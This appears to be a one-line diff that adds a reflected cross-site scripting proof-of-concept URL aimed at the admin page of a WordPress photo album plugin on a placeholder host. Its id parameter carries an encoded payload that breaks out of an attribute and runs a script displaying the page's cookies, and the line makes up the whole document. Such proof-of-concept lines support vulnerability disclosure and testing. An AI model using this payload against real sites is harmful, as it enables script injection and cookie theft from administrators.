@@ -1,0 +1,1 @@
+http://www.example.com/wp-admin/admin.php?page=wp-photo-album/wppa.php&amp;tab=del&amp;id=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
